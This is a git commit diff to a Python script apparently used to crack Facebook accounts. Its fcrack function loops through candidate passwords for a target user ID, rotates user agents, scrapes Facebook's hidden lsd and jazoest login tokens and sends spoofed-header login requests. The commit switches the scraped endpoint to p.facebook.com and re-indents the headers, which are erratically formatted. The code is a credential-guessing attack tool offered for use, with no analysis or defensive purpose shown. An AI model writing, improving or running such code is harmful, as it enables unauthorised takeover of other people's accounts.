20132933de57eeb729153f14262b344fdc87d9dc
MinhazulIslamMinhaj <143911340+MinhazulIslamMinhaj@users.noreply.github.com>
2023-09-07 13:42:41 +0600

    Add files via upload

--- MinhajKhanXd.py
+++ MinhajKhanXd.py
@@ -1454,7 +1454,7 @@ def fcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1467,16 +1467,16 @@ def fcrack(uid,pwx,tl):
             "login":"Log In"}
             
                         
-                                         header_freefb = {'authority': 'p.facebook.com',
+                        header_freefb = {'authority': 'p.facebook.com',
                  
-		    	'upgrade-insecure-requests': '1',
+		            	'upgrade-insecure-requests': '1',
 			
  
-	    		'viewport-width': '980',
+	    	        	'viewport-width': '980',
  
-		    	'method': 'path',
+		            	'method': 'path',
  
-		    	'scheme': 'https',
+		            	'scheme': 'https',
  
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
